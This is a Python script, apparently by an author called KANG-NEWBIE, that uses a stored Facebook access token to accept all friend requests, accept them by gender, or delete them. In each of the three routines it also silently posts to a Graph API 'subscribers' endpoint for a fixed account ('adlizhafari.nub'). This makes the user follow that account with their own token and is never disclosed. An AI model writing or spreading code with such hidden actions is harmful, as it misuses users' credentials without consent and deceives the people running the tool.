#!usr/bin/python3.7
#Author: KANG-NEWBIE
#Contact: t.me/kang_nuubi
#github: github.com/kang-newbie
'''
recode? oke, but don't deleted name author
'''
import requests,sys,os,time,json,re,click
from http.cookiejar import LWPCookieJar as kuki
from src import Genkuki
from bs4 import BeautifulSoup as BS

class Acpt:
	def __init__(self):
		self.req=requests.Session()
		self.ket=open('toket/token.txt','r').read()
		self.main()

	def main(self):
		print("""
\t\t[ Accept All Friends Requests ]
\t\t      [ By: KANG-NEWBIE ]
""")
		r = self.req.get('https://graph.facebook.com/me/friendrequests?limit=5000&access_token='+self.ket);self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ket)
		res = json.loads(r.text)

		if '[]' in str(res['data']):
			exit("[!] no friends requests")
		for i in res['data']:
			req = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(i['from']['id'],self.ket))
			a = json.loads(req.text)
			if 'error' in str(a):
				print("[!] %s [%s] failed"%(i['from']['name'],i['from']['id']))
			else:
				print("[!] %s [%s] confirmed"%(i['from']['name'],i['from']['id']))

class Acpg:
	def __init__(self):
		self.req=requests.Session()
		self.ken=open('toket/token.txt','r').read()
		self.u='https://graph.facebook.com/{}'
		self.banner()

	def banner(self):
		print("""
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	; Accept Friend Requests Based on Gender ;
	;             By KANG-NEWBIE             ;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	""")
		ing=input('[?] Gender F/M: ')
		if ing == 'F' or ing == 'f':
			self.gen='female'
		elif ing == 'M' or ing == 'm':
			self.gen='male'
		else:
			print('STUPID!')
			self.banner()
		lnk=self.u.format('me/friendrequests?limit=5000&access_token='+self.ken);self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ken)
		self.fid(lnk)

	def fid(self,link):
		rq=self.req.get(link)
		js=json.loads(rq.text)
		for x in js['data']:
			id=x['from']['id']
			self.acc(id)
		try:
			self.fid(js['paging']['next'])
		except:
			pass


	def acc(self,id):
		cg=self.req.get(self.u.format(id+'/?access_token='+self.ken))
		jss=json.loads(cg.text)
		try:
			if self.gen == jss['gender']:
				rr=self.req.post(self.u.format('me/friends/'+id+'?access_token='+self.ken))
				jso = json.loads(rr.text)
				if 'True' in str(jso):
					print("[!] %s [%s] confirmed"%(jss['name'],jss['id']))
				else:
					print("[!] %s [%s] failed"%(jss['name'],jss['id']))
		except:
			pass

class Dacpt:
	# Special thanks to karjok pangesty (github.com/karjok)
	# and Thanks to all member of CRABS_ID (t.me/CRABS_ID)
	def __init__(self):
		self.req=requests.Session()
		self.ket=open('toket/token.txt','r').read()
		self.u='https://mbasic.facebook.com{}'
		self.banner()

	def banner(self):
		print("""
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	; Delete all friend requests ;
	;        by KANG-NEWBIE      ;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;""")
		self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ket)
		Genkuki.login(self)
		self.glnk(self.u.format('/friends/center/requests'))

	def glnk(self,url):
		rq=self.req.get(url).text
		bs=BS(rq,'html.parser')
		if 'Hapus Permintaan' in rq:
			for a in bs.find_all('a',string='Hapus Permintaan'):
				lin=self.u.format(a.get('href'))
				id = re.findall(r'\?delete=(.*?)\&redir=',str(lin))
				rr=self.req.get(lin).status_code
				if rr == 200:
					print(f"[+] {id[0]} - succes deleted")
				else:
					print(f"[-] {id[0]} - fail deleted")
		else:
			for a in bs.find_all('a',string='Delete Request'):
				lin=self.u.format(a.get('href'))
				id = re.findall(r'\?delete=(.*?)\&redir=',str(lin))
				rr=self.req.get(lin).status_code
				if rr == 200:
					print(f"[+] {id[0]} - succes deleted")
				else:
					print(f"[-] {id[0]} - fail deleted")
		if 'Lihat selengkapnya' in rq:
			try:
				nx=bs.find('a',string='Lihat selengkapnya').get('href')
				self.glnk(self.u.format(nx))
			except:
				pass
		else:
			try:
				nx=bs.find('a',string='See More').get('href')
				self.glnk(self.u.format(nx))
			except:
				pass

def bannerU():
	print("""
\t;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
\t; F r i e n d  R e q e u s t s ;
\t;        By KANG-NEWBIE        ;
\t;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

[1] Accept all friend requests
[2] Accept friend requests based on gender
[3] Delete all friend reqeusts
""")
	pilih=int(input('[*] kang-newbie_> '))
	if pilih == 1:
		Acpt()
		print("[DONE] if you don't see the results, maybe all friend requests have been approved")
		exit()
	elif pilih == 2:
		Acpg()
		print("[DONE] if you don't see the results, maybe all friend requests have been approved")
		exit()
	elif pilih == 3:
		Dacpt()
		print("[DONE] if you don't see the results, maybe all friend requests have been deleted")
		exit()
	else:
		print('STUPID!')
		bannerU()

try:
	bannerU()
except Exception as e:
	ex = sys.exc_info()
	print(f"[\033[91merror\033[0m] {ex[0].__name__}: {e} at line {ex[2].tb_lineno}")